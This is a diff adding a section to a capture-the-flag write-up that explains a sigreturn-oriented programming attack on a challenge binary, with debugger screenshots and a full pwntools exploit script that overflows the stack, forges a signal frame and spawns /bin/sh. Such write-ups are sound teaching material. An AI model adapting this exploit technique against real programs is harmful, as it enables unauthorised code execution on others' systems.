@@ -186,6 +186,121 @@ And the return value of a function is stored in the `rax` register
 
 This basically means we can control the `rax` register without needing a gadget 🙂
 
+To confirm that I set a breakpoint after the `read() syscall` and I gave input value as `newbie pwner`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dde1509c-e122-4e68-8d8f-f64df8f1a352)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1aac68b0-7bc4-44c7-99c0-41e3f8ba1a70)
+
+We can see that the current value of the `rax` register is `0xd = 13` but the length of our input is `12`, the reason why `rax == 13` is because of the newline character was read as a string 😕
+
+So in the future of writing the exploit, to avoid problems I wouldn't use `sendline()` 
+
+Before performing the sigreturn syscall, the following Signal Frame needs to be present on the stack
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/992a8d27-36de-4034-8eb5-854f56a425af)
+
+Luckily with pwntools we can make use of the `SigreturnFrame` to create the Signal Frame needed on the stack
+
+The end goal is for me to call `execve('/bin/sh', 0x0, 0x0)` to spawn a shell
+
+For that we need to set:
+- rax: 0x3b
+- rdi: address pointing to '/bin/sh'
+- rsi: 0x0
+- rdx: 0x0
+
+Incase you are wondering where those values are from well that's the syscall number for `execve`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c23fb455-1e5a-4383-a07f-b6d9eb7c2402)
+
+Since I'm not passing any parameter to `/bin/sh` I set `rsi & rdx` to `0`
+
+As for the address of `/bin/sh` remember that we initially saw it as the `rsi` value used when `write` was called
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/634056bb-351d-4393-9762-c665fcbaf730)
+
+To get the value of `/bin/sh` I just need to add that address with `15`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/165b4c26-404a-4bc0-9855-7cc449f854cb)
+
+Finally the attack strategy would be:
+- Overwrite the rip to call `vuln()` again thereby giving us another call to `read()`
+- Send in 15 bytes as the input in order to make the `rax` equal `15`
+- The next flow of execution would be setting up the fake signal frame and giving us full control over the executable
+- Spawnning a shell and that's profit!
+
+Here's my exploit script:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'chall')
+elf = exe
+filterwarnings("ignore")
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *vuln+55
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+    global elf
+
+    io = start()
+
+def srop():
+    offset = 32
+    syscall = 0x0000000000401047 # syscall; ret;
+    nbytes = b'A'*15
+    sh = 0x402000+0xf # "/bin/sh"
+
+
+    payload = flat({
+        offset: [
+            elf.sym['vuln'],
+            syscall
+        ]
+    })
+
+    frame = SigreturnFrame()
+    frame.rax = 0x3b
+    frame.rdi = sh
+    frame.rsi = 0x0
+    frame.rdx = 0x0
+    
+    frame.rip = syscall
+
+    payload += bytes(frame)
+
+    io.sendline(payload)
+    io.sendafter(b'world!!', nbytes)
+
+
+def main():
+    
+    init()
+    srop()
+    
+    io.interactive()
+
+if __name__ == '__main__':
+    main()
+```
+
 
 
 
